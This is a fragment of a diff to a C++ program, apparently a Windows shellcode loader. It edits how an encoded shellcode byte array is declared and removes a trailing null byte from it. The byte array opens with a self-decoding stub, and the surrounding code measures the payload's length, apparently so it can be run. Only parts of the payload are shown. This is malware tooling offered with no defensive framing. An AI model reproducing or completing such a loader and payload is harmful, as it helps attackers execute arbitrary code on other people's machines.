@@ -21,7 +21,7 @@ int main(int argc, char *argv[]) {
     // }
 
     /* get the shellcode + it's size from argv*/
-    const char* shellcode =   "\x6a\x30\x59\xd9\xee\xd9\x74"
+    const char shellcode[] =   "\x6a\x30\x59\xd9\xee\xd9\x74"
                               "\x24\xf4\x5b\x81\x73\x13\xf4"
                               "\xdd\xb5\xba\x83\xeb\xfc\xe2"
                               "\xf4\x08\x35\x37\xba\xf4\xdd"
@@ -51,7 +51,7 @@ int main(int argc, char *argv[]) {
                               "\xc6\xfe\x5d\x4e\x5a\x81\xd8"
                               "\x0e\xfd\xe7\xaf\xda\xd0\xf4"
                               "\x8e\x4a\x6f\x97\xbc\xd9\xd9"
-                              "\xf4\xdd\xb5\xba\x00"; 
+                              "\xf4\xdd\xb5\xba"; 
     const std::size_t stShellcodeLen = strlen(shellcode);
 
     DWORD dwShellcodeLen = 0;
